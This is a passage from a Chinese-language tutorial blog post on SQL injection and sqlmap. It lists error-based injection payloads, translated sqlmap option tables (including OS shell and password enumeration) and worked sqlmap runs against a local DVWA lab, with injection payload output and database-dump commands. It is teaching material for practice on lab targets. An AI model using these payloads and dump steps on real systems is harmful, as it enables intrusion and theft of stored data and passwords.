+<li><p>当虚拟表中还未加入<code>NUM 1</code>，假设某条数据为<code>1</code>，其下一条为<code>0</code>；<code>GROUP BY</code>查询<code>1</code>不在虚拟表中，于是创建一个分组；此时<code>FLOOR()</code>和<code>RAND()</code>再次执行，<code>NUM</code>变为<code>0</code>，加入到表中与第一个<code>0</code>分组冲突，从而报错。</p>
+</li>
+<li><img src="https://img-blog.csdnimg.cn/20210207174531823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1OTY5MDYy,size_16,color_FFFFFF,t_70" alt=""></li>
+</ul>
+<h5 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#NUM为<span class="number">01</span>序列的名称</span><br><span class="line">#RAND的种子可以自定义，可以选择一个固定报错的种子</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>),<span class="built_in">FLOOR</span>(RAND(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)NUM <span class="keyword">FROM</span> information_schema.tables <span class="keyword">GROUP</span> <span class="keyword">BY</span> NUM;</span><br></pre></td></tr></table></figure>
+<h4 id="UPDATEXML"><a href="#UPDATEXML" class="headerlink" title="UPDATEXML"></a>UPDATEXML</h4><ul>
+<li>构造<code>Xpath</code>时，使用不合法的格式，从而报错。</li>
+</ul>
+<h5 id="Payload-1"><a href="#Payload-1" class="headerlink" title="Payload"></a>Payload</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#第一个和第三个参数任意</span><br><span class="line">#<span class="operator">~</span>是不符合Xpath语法的，这里会报错</span><br><span class="line">#DATABASE()可以换成你需要的参数，报错时会输出</span><br><span class="line"><span class="keyword">SELECT</span> UPDATEXML(<span class="number">1</span>,CONCAT(<span class="string">&#x27;~&#x27;</span>,DATABASE()),<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+<h4 id="EXTRACTVALUE"><a href="#EXTRACTVALUE" class="headerlink" title="EXTRACTVALUE"></a>EXTRACTVALUE</h4><ul>
+<li>类似<code>UPDATEXML</code>，同样对<code>Xpath</code>进行修改，导致报错。</li>
+</ul>
+<h5 id="Payload-2"><a href="#Payload-2" class="headerlink" title="Payload"></a>Payload</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#与UPDATEXML不同，这里只有两个参数，第一个参数任意</span><br><span class="line"><span class="keyword">SELECT</span> EXTRACTVALUE(<span class="number">1</span>,CONCAT(<span class="string">&#x27;~&#x27;</span>,DATABASE()));</span><br></pre></td></tr></table></figure>
+<h3 id="适用场景-2"><a href="#适用场景-2" class="headerlink" title="适用场景"></a>适用场景</h3><ul>
+<li>没有数据回显点，页面返回报错信息。</li>
+</ul>
+<h2 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h2><ul>
+<li>即可以使用<code>UNION</code>的情况下的注入。</li>
+</ul>
+<h3 id="适用场景-3"><a href="#适用场景-3" class="headerlink" title="适用场景"></a>适用场景</h3><ul>
+<li>需要多条查询返回结果。</li>
+<li><code>UNION</code>不被禁止。</li>
+</ul>
+<h2 id="堆查询注入"><a href="#堆查询注入" class="headerlink" title="堆查询注入"></a>堆查询注入</h2><ul>
+<li>可以同时执行多条语句的执行时的注入。</li>
+<li>和联合查询注入不同的是，堆查询注入的操作任意，不局限于查询，可以增删查改。</li>
+</ul>
+<h3 id="适用场景-4"><a href="#适用场景-4" class="headerlink" title="适用场景"></a>适用场景</h3><ul>
+<li>局限性非常大，连<code>DVWA</code>靶场都不行。</li>
+</ul>
+<h1 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h1><h2 id="Options参数"><a href="#Options参数" class="headerlink" title="Options参数"></a>Options参数</h2><div class="table-container">
+<table>
+<thead>
+<tr>
+<th style="text-align:left">参数</th>
+<th style="text-align:left">功能</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">-h</td>
+<td style="text-align:left">查看基本参数信息</td>
+</tr>
+<tr>
+<td style="text-align:left">-hh</td>
+<td style="text-align:left">查看所有参数信息</td>
+</tr>
+<tr>
+<td style="text-align:left">—version</td>
+<td style="text-align:left">查看版本号</td>
+</tr>
+<tr>
+<td style="text-align:left">-v VERBOSE</td>
+<td style="text-align:left">指定输出等级</td>
+</tr>
+</tbody>
+</table>
+</div>
+<blockquote>
+<p>输出等级一共有7个级别</p>
+<p>0：只显示<code>Python</code>的<code>tracebacks</code>信息、错误信息<code>[ERROR]</code>和关键信息<code>[CRITICAL]</code></p>
+<p>1：同时显示普通信息<code>[INFO]</code>和警告信息<code>[WARNING]</code></p>
+<p>2：同时显示调试信息<code>[DEBUG]</code></p>
+<p>3：同时显示注入使用的攻击荷载</p>
+<p>4：同时显示<code>HTTP</code>请求</p>
+<p>5：同时显示<code>HTTP</code>响应头</p>
+<p>6：同时显示<code>HTTP</code>响应体</p>
+</blockquote>
+<h2 id="Target参数"><a href="#Target参数" class="headerlink" title="Target参数"></a>Target参数</h2><ul>
+<li>必须至少提供其中一个选项来定义目标。</li>
+</ul>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th style="text-align:left">参数</th>
+<th style="text-align:left">功能</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">-u URL</td>
+<td style="text-align:left">指定存在查询的<code>URL</code></td>
+</tr>
+<tr>
+<td style="text-align:left">-g GOOGLEDORK</td>
+<td style="text-align:left">指定使用谷歌查询技巧得到的<code>URL</code></td>
+</tr>
+<tr>
+<td style="text-align:left">-d DIRECT</td>
+<td style="text-align:left">直接连接数据库</td>
+</tr>
+<tr>
+<td style="text-align:left">-l LOGFILE</td>
+<td style="text-align:left">从<code>Burp</code>或<code>WebScarab</code>的日志文件解析目标</td>
+</tr>
+<tr>
+<td style="text-align:left">-r REQUESTFILE</td>
+<td style="text-align:left">从文件中载入<code>HTTP</code>请求</td>
+</tr>
+<tr>
+<td style="text-align:left">-c CONFIGFILE</td>
+<td style="text-align:left">从<code>INI</code>配置文件中加载选项</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h2 id="Request参数"><a href="#Request参数" class="headerlink" title="Request参数"></a>Request参数</h2><ul>
+<li>这些选项可用于指定如何连接到目标<code>URL</code>。</li>
+</ul>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th style="text-align:left">参数</th>
+<th style="text-align:left">功能</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">-A AGENT</td>
+<td style="text-align:left">载入<code>HTTP</code>的<code>User-Agent</code>头</td>
+</tr>
+<tr>
+<td style="text-align:left">-H HEADER</td>
+<td style="text-align:left">载入<code>HTTP</code>的其余信息(例如:<code>XFF</code>)</td>
+</tr>
+<tr>
+<td style="text-align:left">—data=DATA</td>
+<td style="text-align:left">通过<code>POST</code>发送数据</td>
+</tr>
+<tr>
+<td style="text-align:left">—cookie=COOKIE</td>
+<td style="text-align:left">载入<code>HTTP</code>的<code>COOKIE</code>头</td>
+</tr>
+<tr>
+<td style="text-align:left">—method=METHOD</td>
+<td style="text-align:left">强行使用给定的<code>HTTP</code>方法</td>
+</tr>
+<tr>
+<td style="text-align:left">—cookie-del=COOKIE-DEL</td>
+<td style="text-align:left">设置用于划分<code>COOKIE</code>的字符</td>
+</tr>
+<tr>
+<td style="text-align:left">—drop-set-cookie</td>
+<td style="text-align:left">忽略响应的<code>Set – Cookie</code>头信息</td>
+</tr>
+<tr>
+<td style="text-align:left">—random-agent</td>
+<td style="text-align:left">使用随机选定的<code>User – Agent</code>头</td>
+</tr>
+<tr>
+<td style="text-align:left">—referer=REFERER</td>
+<td style="text-align:left">设置<code>REFERER</code>头</td>
+</tr>
+<tr>
+<td style="text-align:left">—proxy=PROXY</td>
+<td style="text-align:left">使用<code>HTTP</code>代理</td>
+</tr>
+<tr>
+<td style="text-align:left">—ignore-proxy</td>
+<td style="text-align:left">忽略系统默认的<code>HTTP</code>代理</td>
+</tr>
+<tr>
+<td style="text-align:left">—delay=DELAY</td>
+<td style="text-align:left">在每个<code>HTTP</code>请求之间的延迟时间</td>
+</tr>
+<tr>
+<td style="text-align:left">—timeout=TIMEOUT</td>
+<td style="text-align:left">连接超时的时间</td>
+</tr>
+<tr>
+<td style="text-align:left">—retries=RETRIES</td>
+<td style="text-align:left">连接超时后重新连接的时间</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h2 id="Optimization参数"><a href="#Optimization参数" class="headerlink" title="Optimization参数"></a>Optimization参数</h2><ul>
+<li>这些选项可用于优化<code>sqlmap</code>的性能。</li>
+</ul>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>-o</td>
+<td>开启所有优化</td>
+</tr>
+<tr>
+<td>-–predict-output</td>
+<td>预测常见的查询输出</td>
+</tr>
+<tr>
+<td>-–keep-alive</td>
+<td>使用持久的<code>HTTP(s)</code>连接</td>
+</tr>
+<tr>
+<td>—null-connection</td>
+<td>从没有实际的<code>HTTP</code>响应体中检索页面长度</td>
+</tr>
+<tr>
+<td>—threads=THREADS</td>
+<td>最大的<code>HTTP(s)</code>请求并发量</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h2 id="Injection参数"><a href="#Injection参数" class="headerlink" title="Injection参数"></a>Injection参数</h2><ul>
+<li>这些选项可用于指定要测试的参数、提供自定义注入<code>Payload</code>和可选篡改脚本。</li>
+</ul>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>-p TESTPARAMETER</td>
+<td>可测试的参数</td>
+</tr>
+<tr>
+<td>—dbms=DBMS</td>
+<td>强制后端的<code>DBMS</code>为此值</td>
+</tr>
+<tr>
+<td>—os=OS</td>
+<td>强制后端的<code>DBMS</code>操作系统为此值</td>
+</tr>
+<tr>
+<td>—prefix=PREFIX</td>
+<td>注入<code>payload</code>字符串前缀</td>
+</tr>
+<tr>
+<td>—suffix=SUFFIX</td>
+<td>注入<code>payload</code>字符串后缀</td>
+</tr>
+<tr>
+<td>—tamper=TAMPER</td>
+<td>使用给定的脚本篡改注入数据</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h2 id="Detection参数"><a href="#Detection参数" class="headerlink" title="Detection参数"></a>Detection参数</h2><ul>
+<li>这些选项可用于自定义检测阶段。</li>
+</ul>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>—level=LEVEL</td>
+<td>执行测试的等级</td>
+</tr>
+<tr>
+<td>—risk=RISK</td>
+<td>执行测试的风险</td>
+</tr>
+<tr>
+<td>—string=STRING</td>
+<td>查询有效时在页面匹配字符串</td>
+</tr>
+<tr>
+<td>—regexp=REGEXP</td>
+<td>查询有效时在页面匹配正则表达式</td>
+</tr>
+<tr>
+<td>—text-only</td>
+<td>仅基于文本内容比较页面</td>
+</tr>
+<tr>
+<td>—smart</td>
+<td>仅当探索为真时才执行彻底的测试</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h2 id="Techniques参数"><a href="#Techniques参数" class="headerlink" title="Techniques参数"></a>Techniques参数</h2><ul>
+<li>这些选项可用于调整特定<code>SQL</code>注入技术的测试。</li>
+</ul>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>—technique=TECH</td>
+<td><code>SQL</code>注入技术测试</td>
+</tr>
+<tr>
+<td>—time-sec=TIMESEC</td>
+<td><code>DBMS</code>响应的延迟时间</td>
+</tr>
+<tr>
+<td>–union-cols=UCOLS</td>
+<td>定列范围用于测试<code>UNION</code>查询注入</td>
+</tr>
+<tr>
+<td>–union-char=UCHAR</td>
+<td>用于暴力猜解列数的字符</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h2 id="Fingerprint参数"><a href="#Fingerprint参数" class="headerlink" title="Fingerprint参数"></a>Fingerprint参数</h2><div class="table-container">
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>-f</td>
+<td>执行检查广泛的<code>DBMS</code>版本指纹</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h2 id="Enumeration参数"><a href="#Enumeration参数" class="headerlink" title="Enumeration参数"></a>Enumeration参数</h2><ul>
+<li>这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。</li>
+</ul>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>-b</td>
+<td>检索数据库管理系统的标识</td>
+</tr>
+<tr>
+<td>—current-user</td>
+<td>检索数据库管理系统当前用户</td>
+</tr>
+<tr>
+<td>—current-db</td>
+<td>检索数据库管理系统当前数据库</td>
+</tr>
+<tr>
+<td>—is-dba</td>
+<td>检测<code>DBMS</code>当前用户是否<code>DBA</code></td>
+</tr>
+<tr>
+<td>—users</td>
+<td>枚举数据库管理系统用户</td>
+</tr>
+<tr>
+<td>—passwords</td>
+<td>枚举数据库管理系统用户密码哈希</td>
+</tr>
+<tr>
+<td>—privileges</td>
+<td>枚举数据库管理系统用户的权限</td>
+</tr>
+<tr>
+<td>—roles</td>
+<td>枚举数据库管理系统用户的角色</td>
+</tr>
+<tr>
+<td>—dbs</td>
+<td>枚举数据库管理系统数据库</td>
+</tr>
+<tr>
+<td>-D DBname</td>
+<td>要进行枚举的指定数据库名</td>
+</tr>
+<tr>
+<td>-T TBLname</td>
+<td>要进行枚举的指定数据库表</td>
+</tr>
+<tr>
+<td>-C COL</td>
+<td>要进行枚举的数据库列</td>
+</tr>
+<tr>
+<td>-U USER</td>
+<td>用来进行枚举的数据库用户</td>
+</tr>
+<tr>
+<td>—tables</td>
+<td>枚举<code>DBMS</code>数据库中的表</td>
+</tr>
+<tr>
+<td>—columns</td>
+<td>枚举<code>DBMS</code>数据库表列</td>
+</tr>
+<tr>
+<td>—dump</td>
+<td>转储数据库管理系统的数据库中的表项</td>
+</tr>
+<tr>
+<td>—dump-all</td>
+<td>转储所有的<code>DBMS</code>数据库表中的条目</td>
+</tr>
+<tr>
+<td>—search</td>
+<td>搜索列，表和/或数据库名称</td>
+</tr>
+<tr>
+<td>—exclude-sysdbs</td>
+<td>枚举表时排除系统数据库</td>
+</tr>
+<tr>
+<td>—start=LIMITSTART</td>
+<td>第一个查询的位置</td>
+</tr>
+<tr>
+<td>—stop=LIMITSTOP</td>
+<td>最后查询的位置</td>
+</tr>
+<tr>
+<td>—first=FIRSTCHAR</td>
+<td>第一个查询输出字的字符检索</td>
+</tr>
+<tr>
+<td>—last=LASTCHAR</td>
+<td>最后查询的输出字字符检索</td>
+</tr>
+<tr>
+<td>—sql-query=QUERY</td>
+<td>要执行的<code>SQL</code>语句</td>
+</tr>
+<tr>
+<td>—sql-shell</td>
+<td>提示交互式<code>SQL</code>的<code>shell</code></td>
+</tr>
+</tbody>
+</table>
+</div>
+<h2 id="Brute-force参数"><a href="#Brute-force参数" class="headerlink" title="Brute force参数"></a>Brute force参数</h2><ul>
+<li>这些选项可以被用来运行暴力破解。</li>
+</ul>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>—common-tables</td>
+<td>检查共同表的存在性</td>
+</tr>
+<tr>
+<td>—common-columns</td>
+<td>检查共同列的存在性</td>
+</tr>
+<tr>
+<td>—common-files</td>
+<td>检查共同文件的存在性</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h2 id="Operating-System-Access参数"><a href="#Operating-System-Access参数" class="headerlink" title="Operating System Access参数"></a>Operating System Access参数</h2><ul>
+<li>这些选项可以用于访问后端数据库管理系统的底层操作系统。</li>
+</ul>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>—os-cmd=OSCMD</td>
+<td>执行操作系统命令</td>
+</tr>
+<tr>
+<td>—os-shell</td>
+<td>交互式的操作系统的<code>shell</code></td>
+</tr>
+<tr>
+<td>—os-pwn</td>
+<td>获取一个<code>OOB shell</code>，<code>meterpreter</code>或<code>VNC</code></td>
+</tr>
+<tr>
+<td>—os-smbrelay</td>
+<td>一键获取一个<code>OOB shell</code>，<code>meterpreter</code>或<code>VNC</code></td>
+</tr>
+<tr>
+<td>—os-bof</td>
+<td>存储过程缓冲区溢出利用</td>
+</tr>
+<tr>
+<td>—priv-esc</td>
+<td>数据库进程用户权限提升</td>
+</tr>
+<tr>
+<td>—tmp-path=TMPPATH</td>
+<td>远程临时文件目录的绝对路径</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h2 id="General参数"><a href="#General参数" class="headerlink" title="General参数"></a>General参数</h2><ul>
+<li>这些选项可以用来设置一些一般的工作参数。</li>
+</ul>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>—t TRAFFICFILE</td>
+<td>记录所有<code>HTTP</code>流量到一个文本文件中</td>
+</tr>
+<tr>
+<td>—s SESSIONFILE</td>
+<td>保存和恢复检索会话文件的所有数据</td>
+</tr>
+<tr>
+<td>—flush-session</td>
+<td>刷新当前目标的会话文件</td>
+</tr>
+<tr>
+<td>—fresh-queries</td>
+<td>忽略在会话文件中存储的查询结果</td>
+</tr>
+<tr>
+<td>—eta</td>
+<td>显示每个输出的预计到达时间</td>
+</tr>
+<tr>
+<td>—update</td>
+<td>更新<code>SQLMAP</code></td>
+</tr>
+<tr>
+<td>—save=SAVECONFIG</td>
+<td>保存选项到<code>INI</code>配置文件</td>
+</tr>
+<tr>
+<td>—batch</td>
+<td>从不询问用户输入，使用所有默认配置</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><h2 id="GET参数"><a href="#GET参数" class="headerlink" title="GET参数"></a>GET参数</h2><ul>
+<li>这里使用<code>Windows</code>本地靶场<code>DVWA</code>的<code>SQL Injection</code>，在<code>Kali</code>虚拟机进行扫描。</li>
+</ul>
+<h3 id="原始Payload"><a href="#原始Payload" class="headerlink" title="原始Payload"></a>原始Payload</h3><ul>
+<li>直接扫描<code>URL</code>。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://&#123;Windows-IP&#125;/dvwa-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>由于<code>DVWA</code>需要登录，<code>Kali</code>是没有<code>Windows</code>登录账号的<code>COOKIE</code>的，故上方<code>Payload</code>扫描不出任何漏洞。</li>
+<li>所以在<code>Windows</code>抓包后，将<code>COOKIE</code>加入<code>Payload</code>。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://&#123;Windows-IP&#125;/dvwa-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> --cookie=<span class="string">&quot;&#123;COOKIE&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#输出</span></span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: <span class="built_in">id</span> (GET)</span><br><span class="line">	<span class="comment">#布尔盲注</span></span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)</span><br><span class="line">    Payload: <span class="built_in">id</span>=1<span class="string">&#x27; OR NOT 4938=4938#&amp;Submit=Submit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    #报错注入</span></span><br><span class="line"><span class="string">    Type: error-based</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)</span></span><br><span class="line"><span class="string">    Payload: id=1&#x27;</span> AND GTID_SUBSET(CONCAT(0x71626b7671,(SELECT (ELT(2858=2858,1))),0x71627a7071),2858)-- qDrZ&amp;Submit=Submit</span><br><span class="line"></span><br><span class="line">    <span class="comment">#时间盲注</span></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: <span class="built_in">id</span>=1<span class="string">&#x27; AND (SELECT 9237 FROM (SELECT(SLEEP(5)))RCwq)-- pggr&amp;Submit=Submit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    #联合注入</span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: MySQL UNION query (NULL) - 2 columns</span></span><br><span class="line"><span class="string">    Payload: id=1&#x27;</span> UNION ALL SELECT NULL,CONCAT(0x71626b7671,0x6b786657706745717a444d55656a69786e70704f4143586874496741624c4444454350617159755a,0x71627a7071)<span class="comment">#&amp;Submit=Submit</span></span><br><span class="line">---</span><br></pre></td></tr></table></figure>
+<h3 id="指定参数"><a href="#指定参数" class="headerlink" title="指定参数"></a>指定参数</h3><ul>
+<li>发现此处有两个参数，真正可能存在注入漏洞的只有一个，故可以使用<code>-p</code>指定参数进行扫描。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://&#123;Windows-IP&#125;/dvwa-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> --cookie=<span class="string">&quot;&#123;COOKIE&#125;&quot;</span> -p <span class="string">&quot;id&quot;</span> </span><br></pre></td></tr></table></figure>
+<h2 id="POST参数"><a href="#POST参数" class="headerlink" title="POST参数"></a>POST参数</h2><ul>
+<li>因为使用的是<code>POST</code>提交，故给出的<code>URL</code>不必包含注入点。</li>
+</ul>
+<h3 id="原始Payload-1"><a href="#原始Payload-1" class="headerlink" title="原始Payload"></a>原始Payload</h3><ul>
+<li>在<code>--data</code>中将<code>POST</code>参数加入，默认以<code>&amp;</code>连接。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://&#123;Windows-IP&#125;/dvwa-master/vulnerabilities/sqli/&quot;</span> --data=<span class="string">&quot;id=1&amp;Submit=Submit&quot;</span></span><br></pre></td></tr></table></figure>
+<h3 id="参数分割"><a href="#参数分割" class="headerlink" title="参数分割"></a>参数分割</h3><ul>
+<li>参数默认以<code>&amp;</code>分割，但仍可以自定义。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#设置&#x27;;&#x27;为POST参数分隔符</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://&#123;Windows-IP&#125;/dvwa-master/vulnerabilities/sqli/&quot;</span> --data=<span class="string">&quot;id=1;Submit=Submit&quot;</span> --param-del=<span class="string">&quot;;&quot;</span></span><br></pre></td></tr></table></figure>
+<h2 id="文件载入"><a href="#文件载入" class="headerlink" title="文件载入"></a>文件载入</h2><ul>
+<li><code>SQLMAP</code>的载入文件主要使用两种方式：<ul>
+<li><code>request</code>请求文件</li>
+<li><code>log</code>记录文件</li>
+</ul>
+</li>
+</ul>
+<h3 id="request文件"><a href="#request文件" class="headerlink" title="request文件"></a>request文件</h3><ul>
+<li>将<code>Burp Suite</code>抓包的报文保存为一个<code>txt</code>文件，下列为我自己抓的包。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /dvwa-master/vulnerabilities/sqli/ HTTP/1.1</span><br><span class="line">Host: 192.168.0.102</span><br><span class="line">Content-Length: 18</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://192.168.0.102</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.146 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://192.168.0.102/dvwa-master/vulnerabilities/sqli/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: security=medium; PHPSESSID=k7f5971ml3cpb85u4vrvt6d9d9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"><span class="built_in">id</span>=1&amp;Submit=Submit</span><br></pre></td></tr></table></figure>
+<ul>
+<li>将报文保存为<code>request.txt</code>后，得到<code>Payload</code>。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r request.txt</span><br></pre></td></tr></table></figure>
+<h3 id="log文件"><a href="#log文件" class="headerlink" title="log文件"></a>log文件</h3><ul>
+<li>在<code>Burp Suite</code>&gt;&gt;<code>Project Options</code>&gt;&gt;<code>Misc</code>&gt;&gt;<code>Logging</code>中的<code>Proxy</code>栏勾选<code>Request</code>即可生成<code>log</code>文件。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -l log.txt</span><br></pre></td></tr></table></figure>
+<h2 id="拖库"><a href="#拖库" class="headerlink" title="拖库"></a>拖库</h2><ul>
+<li><code>SQL</code>注入成功后，从数据库中导出数据 。</li>
+</ul>
+<h3 id="步骤-2"><a href="#步骤-2" class="headerlink" title="步骤"></a>步骤</h3><ul>
+<li>查看所有数据库。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://&#123;Windows-IP&#125;/dvwa-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> --dbs</span><br></pre></td></tr></table></figure>
+<ul>
+<li>选定需要拖的数据库，并显示该数据库中的数据表。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://&#123;Windows-IP&#125;/dvwa-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> -D <span class="string">&quot;&#123;DATABASE-NAME&#125;&quot;</span> --tables</span><br></pre></td></tr></table></figure>
+<ul>
+<li>选定需要拖的数据表，并显示该数据库中的列。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://&#123;Windows-IP&#125;/dvwa-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> -D <span class="string">&quot;&#123;DATABASE-NAME&#125;&quot;</span> -T <span class="string">&quot;&#123;TABLE_NAME&#125;&quot;</span> --columns</span><br></pre></td></tr></table></figure>
+<ul>
+<li>选定需要拖的列，并开始拖库。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://&#123;Windows-IP&#125;/dvwa-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> -D <span class="string">&quot;&#123;DATABASE-NAME&#125;&quot;</span> -T <span class="string">&quot;&#123;TABLE-NAME&#125;&quot;</span> -C <span class="string">&quot;&#123;COLUMN-NAME&#125;&quot;</span> --dump</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><code>SQLMAP</code>很贴心的给了哈希密码的破解，可用于获得明文密码。</p>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
